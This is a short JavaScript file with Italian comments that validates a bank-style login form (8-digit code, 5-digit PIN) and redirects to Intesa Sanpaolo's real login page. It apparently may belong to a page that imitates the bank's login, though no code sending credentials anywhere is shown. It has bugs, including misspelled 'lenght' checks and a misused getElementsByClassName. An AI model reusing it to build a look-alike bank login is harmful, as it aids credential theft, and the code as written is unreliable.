//alert("importato");

document.getElementById("submitDisabled").disabled = true;

window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 60 || document.documentElement.scrollTop > 60) {
    document.getElementsByClassName("topnav2").style.padding = "90px 10px";
  } else {
    document.getElementsByClassName("topnav2").style.padding = "120px 10px";
  }
}

function enableButton() {
  var codice = document.getElementById("codice").value;
  var pin = document.getElementById("pin").value;

  // Verifica se il codice e il PIN contengono solo numeri
  if (!isNaN(codice) && !isNaN(pin) && codice.length === 8 && pin.length === 5) {
    document.getElementById("submitDisabled").disabled = false; // Abilita il pulsante
    document.getElementById("submitDisabled").id = "submit"; // Cambia l'id del pulsante
    document.getElementById("submit").classList.add("active"); // Aggiunge la classe CSS per lo stato attivo
  } else {
    document.getElementById("submit").disabled = true; // Disabilita il pulsante
    document.getElementById("submit").id = "submitDisabled"; // Mantieni l'id del pulsante disabilitato
    document.getElementById("submitDisabled").classList.remove("active"); // Rimuove la classe CSS per lo stato attivo
  }
}

function Intesa(){
	location.href = 'https://www.intesasanpaolo.com/it/persone-e-famiglie/login-page.html';
}

function printError(){
	var codice = document.getElementById("codice").value;
	var pin = document.getElementById("pin").value;
	if (isNaN(codice) || codice.lenght < 8){
		document.getElementById('erroreCodice').hidden = false;
		document.getElementById('codice').style.border= "1px solid red";
	}
	if (isNaN(pin) || pin.lenght < 5){
		document.getElementById('errorePin').hidden = false;
		document.getElementById('pin').style.border= "1px solid red";
	}
}

function deleteError(){
	var codice = document.getElementById("codice").value;
	var pin = document.getElementById("pin").value;
	if (!isNaN(codice)){
		document.getElementById('erroreCodice').hidden = true;
		document.getElementById('codice').style.border= "none";
	} 
	if (!isNaN(pin)){
		document.getElementById('errorePin').hidden = true;
		document.getElementById('pin').style.border= "none";
	}
}